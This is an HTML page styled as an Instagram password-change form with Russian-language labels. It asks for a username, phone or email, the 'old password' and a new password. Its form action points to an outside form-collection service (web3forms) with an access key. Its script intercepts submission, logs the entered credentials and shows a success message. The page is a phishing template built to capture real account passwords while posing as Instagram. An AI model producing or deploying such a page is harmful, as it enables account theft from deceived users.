<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Registration</title>
    <link
      href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
    />
    <style>
      .container {
        padding-top: 5vh;
      }
      .form-container {
        max-width: 600px;
        margin: 0 auto;
        padding: 30px;
        border: 1px solid #ddd;
        border-radius: 10px;
        box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
      }
      .form-control {
        border-radius: 0.5rem;
        padding: 0.75rem 1.25rem;
        font-size: 0.875rem;
        border: 1px solid #ced4da;
        width: 100%;
        box-sizing: border-box;
      }
      .form-control:focus {
        border-color: #007bff;
        box-shadow: 0 0 0 0.2rem rgba(38, 143, 255, 0.25);
      }
      .alert {
        margin-top: 1rem;
        display: none;
      }
    </style>
  </head>
  <body>
    <div class="container d-flex justify-content-center align-items-center min-vh-100">
      <div class="form-container">
        <div class="text-center">
          <form id="registration-form" action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="2ddd3bfc-7607-473b-baf6-01f00ac21efe" />
            <div class="form-group">
              <input
                type="text"
                name="username"
                class="form-control"
                placeholder="Телефон, имя пользователя или эл. адрес"
                required
              />
            </div>
            <div class="form-group">
              <input
                type="password"
                id="old-password"
                name="old_password"
                class="form-control"
                placeholder="Старый пароль"
                minlength="6"
                required
              />
            </div>
            <div class="form-group">
              <input
                type="password"
                id="new-password"
                name="new_password"
                class="form-control"
                placeholder="Новый пароль"
                minlength="6"
                required
              />
              <input type="checkbox" name="botcheck" class="hidden" style="display: none" />
            </div>
            <button type="submit" class="btn btn-primary">Изменить</button>
          </form>
          <div id="success-message" class="alert alert-success" role="alert"></div>
        </div>
      </div>
    </div>

    <script>
      document.getElementById('registration-form').addEventListener('submit', function (event) {
        event.preventDefault(); // Остановить стандартное поведение формы

        const formData = new FormData(this);
        const data = Object.fromEntries(formData.entries());

        // Выводим данные в консоль (или обрабатываем их другим способом)
        console.log(data);

        // Показать сообщение об успехе
        document.getElementById('success-message').textContent = 'Форма успешно отправлена!';
        document.getElementById('success-message').style.display = 'block';

        // Очистить поля формы
        this.reset();
      });
    </script>

    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
